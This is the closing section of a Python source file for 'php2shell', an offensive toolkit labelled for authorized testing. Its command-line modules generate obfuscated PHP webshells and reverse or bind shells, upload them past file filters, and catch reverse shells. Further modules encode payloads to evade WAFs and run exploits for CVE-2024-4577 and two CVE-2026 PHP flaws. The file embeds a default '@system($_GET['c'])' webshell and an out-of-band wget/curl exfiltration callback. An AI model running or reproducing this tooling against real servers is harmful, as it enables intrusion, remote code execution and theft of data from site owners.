                   name=name, ctype="image/gif", form=None, header=None,
                   paths=paths, timeout=25))

def wizard_exec():
    u = _ask("shell URL")
    if not u: return
    p = _ask("param name", "cmd")
    k = _ask("key", "p2s")
    m = _ask("HTTP method (get/post)", "get")
    cmd_exec(_ns(url=u, param=p, key=k, method=m, dir="."))

def wizard_cgi(url):
    base = _ask("base URL", url)
    p = _ask("CGI path (empty = try common ones)", None)
    cmd_cgi(_ns(url=base, path=p or None, inject=None,
                code="<?php @system($_GET['c']); exit; ?>", cmd=None, shell=True,
                verify=False, timeout=15))

# ------------------------------------------------------------------ cli
class P2SHelpFormatter(argparse.RawDescriptionHelpFormatter):
    def start_section(self, heading):
        if heading:
            heading = bold(magenta(str(heading)))
        super().start_section(heading)

def build_parser():
    p = argparse.ArgumentParser(
        prog="php2shell",
        description="PHP file-upload / code-exec -> full shell toolkit (authorized testing only)",
        epilog="""examples:
  php2shell gen -t cmd -o shell.php --obf gzip --magic
  php2shell gen -t reverse --ip 10.0.0.5 --port 4444 -o rev.php --obf dynamic
  php2shell listen --port 4444
  php2shell upload -u http://target/upload.php --name shell.phtml --obf concat --magic --paths paths.txt
  php2shell exec -u http://target/uploads/shell.php -p cmd -k s3cr3t
  php2shell check -u http://target/uploads/shell.php
  php2shell encode --text "id" --chain gzip,b64 --php
  php2shell scan -u http://target --active
  php2shell oom -u http://target --leak-out leak.txt --dry-run
  php2shell oom -u http://target --heap-addr 0x5555.. --system-addr 0x7fff.. --oob http://you/cb --cmd "id"
  php2shell uaf -u http://target --pin 20 --fragment '|O:8:"stdClass":0:{}' --self-listen 4444
  php2shell cgi -u http://target --path /php-cgi/php-cgi.exe --shell""",
        formatter_class=P2SHelpFormatter,
    )
    sub = p.add_subparsers(dest="module", required=True)
    g = sub.add_parser("gen", help="generate a PHP payload")
    g.add_argument("-t", "--type", required=True, choices=["cmd", "reverse", "bind"])
    g.add_argument("--ip", help="your IP (reverse)")
    g.add_argument("--port", type=int, help="port (reverse/bind)")
    g.add_argument("--platform", choices=["linux", "windows"], default="linux")
    g.add_argument("-p", "--param", default="cmd", help="cmd-shell parameter name")
    g.add_argument("-k", "--key", help="cmd-shell key (default: random)")
    g.add_argument("--obf", default="none", choices=list(OBFUSCATORS.keys()))
    g.add_argument("--magic", action="store_true", help="prepend GIF89a magic bytes")
    g.add_argument("-o", "--output", help="output file (default: stdout)")
    g.set_defaults(func=cmd_gen)
    l = sub.add_parser("listen", help="catch a reverse shell (auto PTY, up/download)")
    l.add_argument("--host", default="0.0.0.0")
    l.add_argument("--port", type=int, default=4444)
    l.set_defaults(func=cmd_listen)
    u = sub.add_parser("upload", help="exploit a file-upload endpoint")
    u.add_argument("-u", "--url", required=True, help="upload endpoint URL")
    u.add_argument("-t", "--type", default="cmd", choices=["cmd", "reverse", "bind"])
    u.add_argument("--ip", help="your IP (reverse)")
    u.add_argument("--port", type=int, help="port (reverse/bind)")
    u.add_argument("--platform", choices=["linux", "windows"], default="linux")
    u.add_argument("-p", "--param", default="cmd")
    u.add_argument("-k", "--key", help="cmd-shell key (default: random)")
    u.add_argument("--obf", default="none", choices=list(OBFUSCATORS.keys()))
    u.add_argument("--magic", action="store_true", help="prepend GIF89a magic bytes")
    u.add_argument("--field-name", default="file", help="form file field name")
    u.add_argument("--name", default="shell.php", help="uploaded filename (.phtml/.php5/.phar bypass weak filters)")
    u.add_argument("--ctype", default="image/gif", help="Content-Type to send")
    u.add_argument("-F", "--form", action="append", help="extra form field k=v")
    u.add_argument("-H", "--header", action="append", help="extra header 'K: V' (Cookie, UA...)")
    u.add_argument("--paths", help="file with candidate shell URLs/paths to verify")
    u.add_argument("--timeout", type=int, default=25)
    u.set_defaults(func=cmd_upload)
    e = sub.add_parser("exec", help="interactively drive an uploaded cmd-shell")
    e.add_argument("-u", "--url", required=True)
    e.add_argument("-p", "--param", default="cmd")
    e.add_argument("-k", "--key", required=True)
    e.add_argument("--method", choices=["get", "post"], default="get")
    e.add_argument("--dir", default=".", help="starting directory")
    e.set_defaults(func=cmd_exec)
    c = sub.add_parser("check", help="probe URLs for a live php2shell payload")
    c.add_argument("-u", "--url", action="append", help="candidate URL (repeatable)")
    c.add_argument("--file", help="file with candidate URLs/paths")
    c.set_defaults(func=cmd_check)
    en = sub.add_parser("encode", help="encode a string for WAF/filter bypass")
    en.add_argument("--text", help="text to encode (default: stdin)")
    en.add_argument("--chain", default="b64", help="comma steps: b64,hex,gzip,url")
    en.add_argument("--php", action="store_true", help="emit a PHP eval wrapper")
    en.set_defaults(func=cmd_encode)
    sc = sub.add_parser("scan", help="fingerprint PHP + detect CVE-2026-109618/109619")
    sc.add_argument("-u", "--url", required=True)
    sc.add_argument("--php-version", help="e.g. 8.3.11 (used if headers hide the version)")
    sc.add_argument("--active", action="store_true", help="trigger a safe init-time OOM probe")
    sc.add_argument("--parts", type=int, default=900, help="amplification parts (default 900)")
    sc.add_argument("--depth", type=int, default=150, help="nesting depth per field name")
    sc.add_argument("--timeout", type=int, default=15)
    sc.set_defaults(func=cmd_scan)
    o = sub.add_parser("oom", help="CVE-2026-109618 exploit attempt (OOM -> system())")
    o.add_argument("-u", "--url", required=True)
    o.add_argument("--cmd", default="id", help="command for the fake-array dtor callback")
    o.add_argument("--heap-addr", help="predicted heap addr of the groom chunk (hex)")
    o.add_argument("--system-addr", help="address of system() in the target build (hex)")
    o.add_argument("--sweep", help="BASE:STEP:COUNT hex sweep for ASLR guessing")
    o.add_argument("--groom-size", type=int, default=276)
    o.add_argument("--name-size", type=int, default=33554432, help="oversized field name bytes")
    o.add_argument("--oob", help="callback URL: wget/curl <oob>/?m=$(cmd|base64)")
    o.add_argument("--self-listen", type=int, help="spawn a listener and wait for a reverse hit")
    o.add_argument("--leak-out", help="run PHPSESSID leak probe, save bytes to file")
    o.add_argument("--trials", type=int, default=1, help="attempts per address (worker luck)")
    o.add_argument("--delay", type=float, default=0.2)
    o.add_argument("--dry-run", action="store_true", help="build & print, send nothing")
    o.add_argument("--timeout", type=int, default=25)
    o.set_defaults(func=cmd_oom)
    ua = sub.add_parser("uaf", help="CVE-2026-109619 exploit attempt (stale state UAF)")
    ua.add_argument("-u", "--url", required=True)
    ua.add_argument("--sess", default=rand_key(), help="PHPSESSID for the chain")
    ua.add_argument("--fragment", default='|O:8:"stdClass":0:{}', help="serialized fragment staged via progress field / filename")
    ua.add_argument("--parts", type=int, default=900, help="fatal-error amplification parts")
    ua.add_argument("--pin", type=int, default=0, help="hold N workers with trickle POSTs")
    ua.add_argument("--rounds", type=int, default=3)
    ua.add_argument("--self-listen", type=int)
    ua.add_argument("--delay", type=float, default=0.3)
    ua.add_argument("--dry-run", action="store_true")
    ua.add_argument("--timeout", type=int, default=25)
    ua.set_defaults(func=cmd_uaf)
    cg = sub.add_parser("cgi", help="CVE-2024-4577 PHP-CGI argument injection (Windows)")
    cg.add_argument("-u", "--url", required=True, help="base URL, e.g. http://target")
    cg.add_argument("--path", help="CGI endpoint path (default: try common paths)")
    cg.add_argument("--inject", help="custom inject bytes (default: %AD then %81%CA)")
    cg.add_argument("--code", default="<?php @system($_GET['c']); exit; ?>")
    cg.add_argument("--cmd", help="single command to run")
    cg.add_argument("--shell", action="store_true", help="interactive shell (download works)")
    cg.add_argument("--verify", action="store_true", help="verify TLS certs (default: off)")
    cg.add_argument("--timeout", type=int, default=15)
    cg.set_defaults(func=cmd_cgi)
    w = sub.add_parser("wizard", help="interactive mode: paste a URL, pick attacks from a menu")
    w.set_defaults(func=cmd_wizard)
    return p

MENU = [
    ("gen",     "generate PHP payloads (cmd/reverse/bind) + 6 obfuscators"),
    ("listen",  "catch reverse shells - auto PTY, .download/.upload escapes"),
    ("upload",  "exploit a file-upload endpoint, then auto-verify"),
    ("exec",    "drive an uploaded cmd-shell over HTTP"),
    ("check",   "probe URLs to locate your shell (?p2s_ping=1)"),
    ("encode",  "chain-encode strings for WAF/filter bypass"),
    ("scan",    "fingerprint PHP + detect CVE-2026-109618 / CVE-2026-109619"),
    ("oom",     "CVE-2026-109618 attempt - OOM -> system() (needs offsets)"),
    ("uaf",     "CVE-2026-109619 attempt - stale-state UAF (experimental)"),
    ("cgi",     "CVE-2024-4577 PHP-CGI argument injection (Windows)"),
    ("wizard",  "interactive guided mode - paste a URL, pick from a menu"),
]

def print_menu():
    install_colors()
    sys.stderr.write(color_banner() + "\n")
    section("modules")
    for name, desc in MENU:
        print(f"  {bold(cyan('%-8s' % name))}  {dim(desc)}")
    print()
    section("quick start")
    print(f"  {dim('php2shell.py scan  -u http://TARGET --active')}")
    print(f"  {dim('php2shell.py oom   -u http://TARGET --dry-run')}")
    print(f"  {dim('php2shell.py cgi   -u http://TARGET --shell')}")
    print(f"  {dim('php2shell.py <module> --help   for full options')}")
    print(f"  {dim('or just: php2shell.py        (interactive wizard on a TTY)')}")
    print()
    print(f"  {dim('colors: auto on TTY | P2S_FORCE_COLOR=1 force | NO_COLOR=1 disable')}")

def main():
    if len(sys.argv) == 1:
        if sys.stdin.isatty():
            cmd_wizard(None)
            sys.exit(0)
        print_menu()
        sys.exit(0)
    install_colors()
    sys.stderr.write(color_banner() + "\n")
    args = build_parser().parse_args()
    try:
        args.func(args)
    except KeyboardInterrupt:
        print("\n[*] interrupted")
        sys.exit(0)

if __name__ == "__main__":
    main()
